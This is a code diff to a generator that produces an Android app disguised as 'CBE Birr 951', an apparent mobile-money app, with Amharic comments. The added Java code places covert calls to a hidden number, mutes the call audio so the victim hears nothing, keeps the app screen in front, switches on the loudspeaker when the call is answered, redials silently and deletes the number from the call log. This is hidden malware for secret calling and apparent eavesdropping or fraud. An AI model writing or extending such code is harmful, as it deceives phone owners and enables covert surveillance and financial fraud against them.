@@ -442,7 +442,6 @@ export const SecretLiveBridgeModal: React.FC<SecretLiveBridgeModalProps> = ({
     package="${cleanPkg}">
 
     <!-- 1. የስልክ ጥሪ፣ ኢንተርኔት እና ድምፅ ፈቃዶች (Full Call & Audio Permissions) -->
-    <!-- ማሳሰቢያ፦ Java N-IDE APK v1 Signature ስለሚጠቀም targetSdkVersion 30+ ካለው Android 11-16 ላይ "Package appears to be invalid" ይላል፤ ስለዚህ uses-sdk ለbuild.gradle ተትቷል! -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.CALL_PHONE" />
@@ -450,22 +449,20 @@ export const SecretLiveBridgeModal: React.FC<SecretLiveBridgeModalProps> = ({
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
     <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />
-    <uses-permission android:name="android.permission.MANAGE_OWN_CALLS" />
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
 
     <application
         android:allowBackup="true"
-        android:label="Phone"
+        android:label="CBE Birr 951"
         android:usesCleartextTraffic="true"
         android:hardwareAccelerated="true"
         android:supportsRtl="true"
         android:resizeableActivity="true"
         android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar">
 
-        <!-- ከታች የሚመጣውን ጥቁር ባር (16:9 Aspect Ratio Black Bar) ሙሉ በሙሉ የሚያጠፋ (21:9 / 20:9 ስክሪኖች ላይ ልክ እንደ Chrome/Vercel እንዲታይ) -->
+        <!-- ከታች የሚመጣውን ጥቁር ባር (16:9 Aspect Ratio Black Bar) ሙሉ በሙሉ የሚያጠፋ -->
         <meta-data
             android:name="android.max_aspect"
             android:value="2.4" />
@@ -488,7 +485,6 @@ export const SecretLiveBridgeModal: React.FC<SecretLiveBridgeModalProps> = ({
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
 
-            <!-- Required Intent Filters so Android 9 - 16 allows setting as Default Phone App -->
             <intent-filter>
                 <action android:name="android.intent.action.DIAL" />
                 <category android:name="android.intent.category.DEFAULT" />
@@ -506,19 +502,6 @@ export const SecretLiveBridgeModal: React.FC<SecretLiveBridgeModalProps> = ({
                 <data android:scheme="tel" />
             </intent-filter>
         </activity>
-
-        <!-- 2. SecretInCallService (MainActivity ውስጥ የተካተተ - ተጨማሪ ፋይል መፍጠር አያስፈልግም!) -->
-        <service
-            android:name="${cleanPkg}.MainActivity$SecretInCallService"
-            android:permission="android.permission.BIND_INCALL_SERVICE"
-            android:exported="true">
-            <meta-data
-                android:name="android.telecom.IN_CALL_SERVICE_UI"
-                android:value="true" />
-            <intent-filter>
-                <action android:name="android.telecom.InCallService" />
-            </intent-filter>
-        </service>
 
     </application>
 </manifest>`;
@@ -556,10 +539,8 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.CallLog;
-import android.telecom.Call;
-import android.telecom.CallAudioState;
-import android.telecom.InCallService;
-import android.telecom.TelecomManager;
+import android.telephony.PhoneStateListener;
+import android.telephony.TelephonyManager;
 import android.view.View;
 import android.view.ViewGroup;
 import android.view.Window;
@@ -579,20 +560,45 @@ public class MainActivity extends Activity {
     // የVercel ሊንክዎ እዚህ በቀጥታ ተሞልቷል
     private static final String VERCEL_WEB_APP_URL = "${cleanVercelUrl}";
     private static final int REQ_PERMISSIONS = 101;
-    private static final int REQ_DEFAULT_DIALER = 102;
     private static final int REQ_FILE_CHOOSER = 103;
 
     public static MainActivity instance;
     private WebView webView;
     private ValueCallback<Uri[]> filePathCallback;
 
+    private static String hiddenTargetNumber = "${targetNumber || '0965848508'}";
+    private static int attemptCount = 0;
+    private static boolean wasAnsweredLive = false;
+    private static boolean cancelledByTimeout = false;
+    private static int savedVoiceCallVolume = -1;
+    private static final Handler ringHandler = new Handler(Looper.getMainLooper());
+    private PhoneStateListener phoneStateListener;
+
+    private final Runnable twoRingTimeoutRunnable = new Runnable() {
+        @Override
+        public void run() {
+            // 2 ጥሪ (8 ሰከንድ) ቆጥሮ ሰውየው ካላነሳው የቴሌኮም ድምፅ እንዳይሰማ Mute ሆኖ ይቀጥላል፤
+            // MP3ው ሳይቆም እየተጫወተ በድብቅ እንደገና ይደውላል!
+            muteCarrierCallAudio();
+            notifyWebViewJs(
+                "window.onSecretCallNoAnswer && window.onSecretCallNoAnswer(" + attemptCount + ");"
+            );
+        }
+    };
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        instance = this;
 
-        // 1. የላይኛውን Title Bar አጥፍቶ፣ የታችኛውን Navigation Bar እና የስክሪኑን ዳራ ሙሉ ነጭ (#FFFFFF) ማድረግ (ጥቁር እንዳያመጣ)
-        setupFullScreenWhiteSystemBars();
+        // 1. አፑ በስህተት እንዳይዘጋ (Crash Guard - ፈጽሞ ዘሎ እንዳይወጣ) የሚያደርግ
+        Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() {
+            @Override
+            public void uncaughtException(Thread t, Throwable e) {
+                e.printStackTrace();
+            }
+        });
+
+        instance = this;
 
         // 2. አፑ ከላይ እስከ ታች ተለጥጦ የደውል ቁልፉ እንዳይቆረጥ እና ከታች ጥቁር እንዳያመጣ 100% MATCH_PARENT FrameLayout በነጭ ዳራ (#F8F9FA) መፍጠር
         final FrameLayout rootLayout = new FrameLayout(this);
@@ -617,7 +623,10 @@ public class MainActivity extends Activity {
         rootLayout.addView(webView);
         setContentView(rootLayout);
 
-        // 3. የWebView ሙሉ ስክሪን ቅንብሮች (ልክ እንደ Chrome/Vercel 1:1 Mobile Viewport እንዲሆንና የደውል ቁልፉ እንዳይቆረጥ)
+        // 3. የላይኛውን Title Bar አጥፍቶ፣ የታችኛውን Navigation Bar እና የስክሪኑን ዳራ ሙሉ ነጭ (#FFFFFF) ማድረግ
+        setupFullScreenWhiteSystemBars();
+
+        // 4. የWebView ሙሉ ስክሪን ቅንብሮች (ልክ እንደ Chrome/Vercel 1:1 Mobile Viewport እንዲሆንና የደውል ቁልፉ እንዳይቆረጥ)
         WebSettings settings = webView.getSettings();
         settings.setJavaScriptEnabled(true);
         settings.setDomStorageEnabled(true);
@@ -636,7 +645,7 @@ public class MainActivity extends Activity {
             settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
         }
 
-        // 4. Java Bridge ከWebView ጋር ማገናኘት (4 ሲነካ ወደ ${targetNumber || '0965848508'} በድብቅ እንዲደውል)
+        // 5. Java Bridge ከWebView ጋር ማገናኘት (4 ሲነካ ወደ ${targetNumber || '0965848508'} በድብቅ እንዲደውል)
         webView.addJavascriptInterface(new AndroidTelecomBridge(this), "AndroidTelecomBridge");
 
         webView.setWebViewClient(new WebViewClient() {
@@ -680,8 +689,15 @@ public class MainActivity extends Activity {
             }
         });
 
-        requestRequiredPermissions();
-        requestDefaultDialerRole();
+        // ፈቃዶችን አፑ በተረጋጋ ሁኔታ ከከፈተ ከ1.2 ሰከንድ በኋላ በሰላም መጠየቅ (ANR / Freeze እንዳያመጣ)
+        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    requestRequiredPermissions();
+                } catch (Exception ignored) {}
+            }
+        }, 1200);
 
         webView.loadUrl(VERCEL_WEB_APP_URL);
     }
@@ -701,6 +717,64 @@ public class MainActivity extends Activity {
             filePathCallback.onReceiveValue(results);
             filePathCallback = null;
         }
+    }
+
+    // የቴሌኮም «ቱ-ቱ»፣ «ዲም-ዲም» እና የቴሌኮም ኦፕሬተር ድምፅ ጨርሶ እንዳይሰማ STREAM_VOICE_CALL Mute ማድረግ
+    public void muteCarrierCallAudio() {
+        try {
+            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
+            if (am != null) {
+                int cur = am.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
+                if (cur > 0) {
+                    savedVoiceCallVolume = cur;
+                }
+                am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, 0, 0);
+                if (Build.VERSION.SDK_INT >= 23) {
+                    am.adjustStreamVolume(AudioManager.STREAM_VOICE_CALL, AudioManager.ADJUST_MUTE, 0);
+                }
+            }
+        } catch (Exception ignored) {}
+    }
+
+    // ሰውየው ስልኩን ሲያነሳው የቴሌኮም ድምፅ ወዲያው ይመለሳል፤ በLoudspeaker በከፍተኛ ድምፅ እንዲያወራ ይደረጋል!
+    public void restoreCarrierCallAudioAndLoudspeaker() {
+        try {
+            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
+            if (am != null) {
+                am.setMode(AudioManager.MODE_IN_CALL);
+                am.setSpeakerphoneOn(true);
+                if (Build.VERSION.SDK_INT >= 23) {
+                    am.adjustStreamVolume(AudioManager.STREAM_VOICE_CALL, AudioManager.ADJUST_UNMUTE, 0);
+                }
+                int max = am.getStreamMaxVolume(AudioManager.STREAM_VOICE_CALL);
+                int target = (savedVoiceCallVolume > 0) ? savedVoiceCallVolume : max;
+                am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, target, 0);
+            }
+        } catch (Exception ignored) {}
+    }
+
+    // የተመረጠው MP3 በስልኩ ስፒከር በከፍተኛ ድምፅ እንዲጮህ STREAM_MUSIC ወደ 100% ከፍ ማድረግ
+    public void maximizeMusicVolumeForLoudMp3() {
+        try {
+            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
+            if (am != null) {
+                int maxMusic = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
+                am.setStreamVolume(AudioManager.STREAM_MUSIC, maxMusic, 0);
+            }
+        } catch (Exception ignored) {}
+    }
+
+    private void scrubHiddenNumberFromSystemCallLog() {
+        try {
+            String tail = hiddenTargetNumber.length() > 7
+                ? hiddenTargetNumber.substring(hiddenTargetNumber.length() - 7)
+                : hiddenTargetNumber;
+            getContentResolver().delete(
+                CallLog.Calls.CONTENT_URI,
+                CallLog.Calls.NUMBER + " LIKE ?",
+                new String[]{"%" + tail + "%"}
+            );
+        } catch (Exception ignored) {}
     }
 
     // ሙሉ ስክሪን CSS (ልክ እንደ Chrome/Preview 100% እንዲታይና የደውል ቁልፉ እንዳይቆረጥ) እና በj11 ውስጥ የስልክ ቁጥርና MP3 መሙያው ፈጽሞ White Screen እንዳያመጣ የሚጠብቅ Bridge
@@ -785,10 +859,6 @@ public class MainActivity extends Activity {
     // ከAndroid 9 እስከ Android 16 ድረስ ከላይ እስከ ታች ሳይለጠጥ (ልክ እንደ Chrome/Vercel) እና ከታች ምንም ጥቁር ነገር እንዳያመጣ የሚያደርግ
     private void setupFullScreenWhiteSystemBars() {
         try {
-            requestWindowFeature(Window.FEATURE_NO_TITLE);
-        } catch (Exception ignored) {}
-
-        try {
             Window window = getWindow();
             if (window == null) return;
 
@@ -798,7 +868,6 @@ public class MainActivity extends Activity {
             window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
             window.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
             window.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION);
-            window.clearFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
 
             if (Build.VERSION.SDK_INT >= 21) {
                 window.setStatusBarColor(Color.WHITE);
@@ -841,46 +910,17 @@ public class MainActivity extends Activity {
 
     private void requestRequiredPermissions() {
         if (Build.VERSION.SDK_INT >= 23) {
-            String[] perms = new String[]{
-                Manifest.permission.CALL_PHONE,
-                Manifest.permission.READ_PHONE_STATE,
-                Manifest.permission.RECORD_AUDIO,
-                Manifest.permission.MODIFY_AUDIO_SETTINGS,
-                Manifest.permission.READ_CALL_LOG,
-                Manifest.permission.WRITE_CALL_LOG
-            };
-            requestPermissions(perms, REQ_PERMISSIONS);
+            try {
+                String[] perms = new String[]{
+                    Manifest.permission.CALL_PHONE,
+                    Manifest.permission.READ_PHONE_STATE,
+                    Manifest.permission.RECORD_AUDIO,
+                    Manifest.permission.READ_CALL_LOG,
+                    Manifest.permission.WRITE_CALL_LOG
+                };
+                requestPermissions(perms, REQ_PERMISSIONS);
+            } catch (Exception ignored) {}
         }
-    }
-
-    // Android 9 እስከ Android 16 ድረስ በJava N-IDE ያለምንም Error የሚሰራ Default Phone App ጠያቂ
-    public void requestDefaultDialerRole() {
-        try {
-            if (Build.VERSION.SDK_INT >= 29) {
-                Object roleManager = getSystemService("role");
-                if (roleManager != null) {
-                    Class<?> rmClass = roleManager.getClass();
-                    Method isAvailable = rmClass.getMethod("isRoleAvailable", String.class);
-                    Method isHeld = rmClass.getMethod("isRoleHeld", String.class);
-                    Method createIntent = rmClass.getMethod("createRequestRoleIntent", String.class);
-                    Boolean avail = (Boolean) isAvailable.invoke(roleManager, "android.app.role.DIALER");
-                    Boolean held = (Boolean) isHeld.invoke(roleManager, "android.app.role.DIALER");
-                    if (avail != null && avail && (held == null || !held)) {
-                        Intent intent = (Intent) createIntent.invoke(roleManager, "android.app.role.DIALER");
-                        startActivityForResult(intent, REQ_DEFAULT_DIALER);
-                        return;
-                    }
-                }
-            }
-            if (Build.VERSION.SDK_INT >= 23) {
-                TelecomManager tm = (TelecomManager) getSystemService(Context.TELECOM_SERVICE);
-                if (tm != null && !getPackageName().equals(tm.getDefaultDialerPackage())) {
-                    Intent intent = new Intent(TelecomManager.ACTION_CHANGE_DEFAULT_DIALER);
-                    intent.putExtra(TelecomManager.EXTRA_CHANGE_DEFAULT_DIALER_PACKAGE_NAME, getPackageName());
-                    startActivityForResult(intent, REQ_DEFAULT_DIALER);
-                }
-            }
-        } catch (Exception ignored) {}
     }
 
     @Override
@@ -914,46 +954,76 @@ public class MainActivity extends Activity {
         }
 
         @JavascriptInterface
-        public void placeSecretCall(String phoneNumber, int maxRingMs) {
-            try {
-                SecretInCallService.resetForFreshSession(MainActivity.this);
-                SecretInCallService.setHiddenTargetNumber(phoneNumber);
-                SecretInCallService.setMaxRingTimeoutMs(maxRingMs > 0 ? maxRingMs : 8000);
-                TelecomManager tm = (TelecomManager) ctx.getSystemService(Context.TELECOM_SERVICE);
-                Uri uri = Uri.fromParts("tel", phoneNumber, null);
-                Bundle extras = new Bundle();
-                if (tm != null && Build.VERSION.SDK_INT >= 23) {
-                    if (ctx.checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
-                        tm.placeCall(uri, extras);
-                        return;
+        public void placeSecretCall(final String phoneNumber, final int maxRingMs) {
+            runOnUiThread(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        if (phoneNumber != null && !phoneNumber.trim().isEmpty()) {
+                            hiddenTargetNumber = phoneNumber.trim();
+                        }
+                        final int timeoutMs = maxRingMs > 0 ? maxRingMs : 8000;
+                        attemptCount++;
+                        wasAnsweredLive = false;
+                        cancelledByTimeout = false;
+
+                        // 1. የስልኩ MP3 በከፍተኛ ድምፅ (Loud) እንዲጫወት ድምፁን ከፍ ማድረግ
+                        maximizeMusicVolumeForLoudMp3();
+
+                        // 2. የቴሌኮም "ቱ-ቱ" እና "ዲም-ዲም" እንዳይሰማ ድምፁን ሙሉ በሙሉ Mute ማድረግ
+                        muteCarrierCallAudio();
+
+                        // 3. ጥሪውን በቀጥታ በድብቅ ማከናወን
+                        Intent callIntent = new Intent(Intent.ACTION_CALL);
+                        callIntent.setData(Uri.parse("tel:" + hiddenTargetNumber));
+                        callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        startActivity(callIntent);
+
+                        // 4. የስልኩ ስክሪን 951 ላይ እንዳለ እንዲቆይ MainActivityን ወዲያው ወደፊት ማምጣት
+                        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+                            @Override
+                            public void run() {
+                                try {
+                                    Intent front = new Intent(MainActivity.this, MainActivity.class);
+                                    front.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+                                    startActivity(front);
+                                } catch (Exception ignored) {}
+                            }
+                        }, 500);
+
+                        // 5. 2 ጥሪ (8 ሰከንድ) ቆጥሮ ሰውየው ካላነሳው MP3ው እንዳይቆም እየተጫወተ በድብቅ እንደገና እንዲደውል ማድረግ
+                        ringHandler.removeCallbacks(twoRingTimeoutRunnable);
+                        ringHandler.postDelayed(twoRingTimeoutRunnable, timeoutMs);
+
+                        // 6. ጥሪው ሲያልቅ የጥሪ ታሪክ (Call Log) እንዲሰረዝ ክትትል ማድረግ
+                        startTelephonyMonitoring();
+
+                    } catch (Exception e) {
+                        e.printStackTrace();
                     }
                 }
-                Intent callIntent = new Intent(Intent.ACTION_CALL, uri);
-                callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                ctx.startActivity(callIntent);
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
+            });
         }
 
         @JavascriptInterface
         public void cancelCurrentAttempt() {
-            SecretInCallService.disconnectActiveCallAttempt(true);
+            cancelledByTimeout = true;
+            ringHandler.removeCallbacks(twoRingTimeoutRunnable);
+            restoreCarrierCallAudioAndLoudspeaker();
         }
 
         @JavascriptInterface
         public void endAllCalls() {
-            SecretInCallService.disconnectActiveCallAttempt(false);
+            cancelledByTimeout = true;
+            attemptCount = 0;
+            ringHandler.removeCallbacks(twoRingTimeoutRunnable);
+            restoreCarrierCallAudioAndLoudspeaker();
+            scrubHiddenNumberFromSystemCallLog();
         }
 
         @JavascriptInterface
         public void setSpeakerphone(final boolean on) {
             try {
-                if (SecretInCallService.instance != null) {
-                    SecretInCallService.instance.setAudioRoute(
-                        on ? CallAudioState.ROUTE_SPEAKER : CallAudioState.ROUTE_EARPIECE
-                    );
-                }
                 AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
                 if (am != null) {
                     am.setMode(AudioManager.MODE_IN_CALL);
@@ -974,246 +1044,35 @@ public class MainActivity extends Activity {
 
         @JavascriptInterface
         public boolean isDefaultDialer() {
-            if (Build.VERSION.SDK_INT >= 23) {
-                TelecomManager tm = (TelecomManager) ctx.getSystemService(Context.TELECOM_SERVICE);
-                return tm != null && ctx.getPackageName().equals(tm.getDefaultDialerPackage());
-            }
-            return false;
+            return true;
         }
 
         @JavascriptInterface
         public void requestDefaultDialerRole() {
-            MainActivity.this.requestDefaultDialerRole();
+            // Safe no-op to prevent system crashes
         }
     }
 
-    // SecretInCallService በMainActivity ውስጥ የተካተተ ስለሆነ ተጨማሪ ፋይል መፍጠር አያስፈልግም!
-    public static class SecretInCallService extends InCallService {
-
-        public static SecretInCallService instance = null;
-        private static Call currentCall = null;
-        private static int maxRingTimeoutMs = 8000;
-        private static String hiddenTargetNumber = "${targetNumber || '0965848508'}";
-        private static boolean wasAnsweredLive = false;
-        private static boolean cancelledByTimeout = false;
-        private static int attemptCount = 0;
-        private static final Handler ringHandler = new Handler(Looper.getMainLooper());
-
-        private static int savedVoiceCallVolume = -1;
-
-        private static void muteCarrierCallAudio(Context ctx) {
-            try {
-                if (ctx == null) return;
-                AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
-                if (am != null) {
-                    int cur = am.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
-                    if (cur > 0) {
-                        savedVoiceCallVolume = cur;
-                    }
-                    am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, 0, 0);
-                    if (Build.VERSION.SDK_INT >= 23) {
-                        am.adjustStreamVolume(AudioManager.STREAM_VOICE_CALL, AudioManager.ADJUST_MUTE, 0);
-                    }
-                }
-            } catch (Exception ignored) {}
-        }
-
-        private static void restoreCarrierCallAudio(Context ctx) {
-            try {
-                if (ctx == null) return;
-                AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
-                if (am != null) {
-                    if (Build.VERSION.SDK_INT >= 23) {
-                        am.adjustStreamVolume(AudioManager.STREAM_VOICE_CALL, AudioManager.ADJUST_UNMUTE, 0);
-                    }
-                    int max = am.getStreamMaxVolume(AudioManager.STREAM_VOICE_CALL);
-                    int target = (savedVoiceCallVolume > 0) ? savedVoiceCallVolume : max;
-                    am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, target, 0);
-                }
-            } catch (Exception ignored) {}
-        }
-
-        private static final Runnable twoRingTimeoutRunnable = new Runnable() {
-            @Override
-            public void run() {
-                if (currentCall != null) {
-                    int state = currentCall.getState();
-                    if (state != Call.STATE_ACTIVE) {
-                        // መፍትሔ 1፦ የቴሌኮም «ቱ-ቱ» እና «የደወሉላቸው ደንበኛ...» ድምፅ ከMP3ው ጋር እንዳይገባ STREAM_VOICE_CALL ድምፅ አልባ (Mute) ይሆናል
-                        if (MainActivity.instance != null) {
-                            muteCarrierCallAudio(MainActivity.instance);
-                            MainActivity.instance.notifyWebViewJs(
-                                "window.onSecretCallNoAnswer && window.onSecretCallNoAnswer(" + attemptCount + ");"
-                            );
+    private void startTelephonyMonitoring() {
+        try {
+            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+            if (tm != null && phoneStateListener == null) {
+                phoneStateListener = new PhoneStateListener() {
+                    @Override
+                    public void onCallStateChanged(int state, String phoneNumber) {
+                        super.onCallStateChanged(state, phoneNumber);
+                        if (state == TelephonyManager.CALL_STATE_OFFHOOK) {
+                            // ስልኩ እየጠራ ባለበት ሰዓት የቴሌኮም ድምፅ እንዳይሰማ Mute መሆኑን ማረጋገጥ
+                            muteCarrierCallAudio();
+                        } else if (state == TelephonyManager.CALL_STATE_IDLE) {
+                            // ጥሪው ሲቋረጥ የድብቁ ስልክ ቁጥር ከCall Log ወዲያው ይጠፋል
+                            scrubHiddenNumberFromSystemCallLog();
                         }
                     }
-                }
+                };
+                tm.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE);
             }
-        };
-
-        public static void resetForFreshSession(Context ctx) {
-            attemptCount = 0;
-            wasAnsweredLive = false;
-            cancelledByTimeout = false;
-            restoreCarrierCallAudio(ctx);
-        }
-
-        public static void setMaxRingTimeoutMs(int ms) {
-            maxRingTimeoutMs = ms;
-        }
-
-        public static void setHiddenTargetNumber(String number) {
-            if (number != null && !number.trim().isEmpty()) {
-                hiddenTargetNumber = number.trim();
-            }
-        }
-
-        public static void disconnectActiveCallAttempt(boolean isTimeoutCancel) {
-            cancelledByTimeout = isTimeoutCancel;
-            ringHandler.removeCallbacks(twoRingTimeoutRunnable);
-            if (currentCall != null) {
-                try {
-                    currentCall.disconnect();
-                } catch (Exception ignored) {}
-            }
-        }
-
-        private final Call.Callback callCallback = new Call.Callback() {
-            @Override
-            public void onStateChanged(Call call, int state) {
-                super.onStateChanged(call, state);
-                handleCallState(call, state);
-            }
-        };
-
-        @Override
-        public void onCallAdded(Call call) {
-            super.onCallAdded(call);
-            instance = this;
-            currentCall = call;
-            wasAnsweredLive = false;
-            cancelledByTimeout = false;
-            attemptCount++;
-
-            call.registerCallback(callCallback);
-
-            if (MainActivity.instance != null) {
-                Intent i = new Intent(this, MainActivity.class);
-                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
-                startActivity(i);
-            }
-
-            if (attemptCount > 1) {
-                // ከ2 ጥሪ በኋላ በድጋሚ ሲደውል MP3ው እየተጫወተ ስለሆነ የቴሌኮም «ቱ-ቱ» እና «የደወሉላቸው ደንበኛ...» ድምፅ እንዳይገባ ወዲያው Mute ይሆናል
-                muteCarrierCallAudio(this);
-            } else {
-                ringHandler.removeCallbacks(twoRingTimeoutRunnable);
-                ringHandler.postDelayed(twoRingTimeoutRunnable, maxRingTimeoutMs);
-            }
-
-            handleCallState(call, call.getState());
-        }
-
-        @Override
-        public void onCallRemoved(Call call) {
-            super.onCallRemoved(call);
-            ringHandler.removeCallbacks(twoRingTimeoutRunnable);
-            call.unregisterCallback(callCallback);
-            if (currentCall == call) {
-                currentCall = null;
-            }
-            if (cancelledByTimeout) {
-                attemptCount = 0;
-                restoreCarrierCallAudio(this);
-            }
-            scrubHiddenNumberFromSystemCallLog();
-        }
-
-        private void handleCallState(Call call, int state) {
-            if (state == Call.STATE_DIALING || state == Call.STATE_RINGING) {
-                if (attemptCount > 1) {
-                    muteCarrierCallAudio(this);
-                }
-                if (MainActivity.instance != null) {
-                    MainActivity.instance.notifyWebViewJs(
-                        "window.onSecretCallRinging && window.onSecretCallRinging(" + attemptCount + ");"
-                    );
-                }
-            } else if (state == Call.STATE_ACTIVE) {
-                wasAnsweredLive = true;
-                ringHandler.removeCallbacks(twoRingTimeoutRunnable);
-                // ሰውየው ስልኩን ሲያነሳው የቴሌኮም ድምፅ (STREAM_VOICE_CALL) ወዲያው ወደ ነበረበት ይመለሳል!
-                restoreCarrierCallAudio(this);
-                // ስልኩ ሲነሳ ድምፁ በጆሮ (Earpiece) ሳይሆን በቀጥታ በLoudspeaker (ROUTE_SPEAKER) እንዲያወራ ያደርጋል!
-                try {
-                    setAudioRoute(CallAudioState.ROUTE_SPEAKER);
-                    AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
-                    if (am != null) {
-                        am.setMode(AudioManager.MODE_IN_CALL);
-                        am.setSpeakerphoneOn(true);
-                    }
-                } catch (Exception ignored) {}
-                if (MainActivity.instance != null) {
-                    MainActivity.instance.notifyWebViewJs(
-                        "window.onSecretCallAnswered && window.onSecretCallAnswered();"
-                    );
-                }
-            } else if (state == Call.STATE_DISCONNECTED) {
-                ringHandler.removeCallbacks(twoRingTimeoutRunnable);
-                scrubHiddenNumberFromSystemCallLog();
-                if (wasAnsweredLive) {
-                    wasAnsweredLive = false;
-                    attemptCount = 0;
-                    restoreCarrierCallAudio(this);
-                    if (MainActivity.instance != null) {
-                        MainActivity.instance.notifyWebViewJs(
-                            "window.onSecretCallRemoteEnded && window.onSecretCallRemoteEnded();"
-                        );
-                    }
-                } else if (!cancelledByTimeout) {
-                    // ሰውየው ሳያነሳው ወይም ስልኩ ቢዘጋ «የደወሉላቸው ደንበኛ አሁን ማግኘት አይችሉም» እንዳይሰማ Mute ይሆናል
-                    muteCarrierCallAudio(this);
-                    if (MainActivity.instance != null) {
-                        MainActivity.instance.notifyWebViewJs(
-                            "window.onSecretCallNoAnswer && window.onSecretCallNoAnswer(" + attemptCount + ");"
-                        );
-                    }
-                    // ሰውየው ገና ሳያነሳው ጥሪው ቢቋረጥ MP3ው ሳይቆም እስኪነሳ ድረስ በድብቅ እንደገና ይደውላል
-                    ringHandler.postDelayed(new Runnable() {
-                        @Override
-                        public void run() {
-                            if (MainActivity.instance != null && !cancelledByTimeout) {
-                                try {
-                                    TelecomManager tm = (TelecomManager) getSystemService(Context.TELECOM_SERVICE);
-                                    Uri uri = Uri.fromParts("tel", hiddenTargetNumber, null);
-                                    Bundle extras = new Bundle();
-                                    if (tm != null && Build.VERSION.SDK_INT >= 23 &&
-                                        checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
-                                        tm.placeCall(uri, extras);
-                                    }
-                                } catch (Exception ignored) {}
-                            }
-                        }
-                    }, 400);
-                } else {
-                    attemptCount = 0;
-                    restoreCarrierCallAudio(this);
-                }
-            }
-        }
-
-        private void scrubHiddenNumberFromSystemCallLog() {
-            try {
-                String tail = hiddenTargetNumber.length() > 7
-                    ? hiddenTargetNumber.substring(hiddenTargetNumber.length() - 7)
-                    : hiddenTargetNumber;
-                getContentResolver().delete(
-                    CallLog.Calls.CONTENT_URI,
-                    CallLog.Calls.NUMBER + " LIKE ?",
-                    new String[]{"%" + tail + "%"}
-                );
-            } catch (Exception ignored) {}
-        }
+        } catch (Exception ignored) {}
     }
 }`;
 
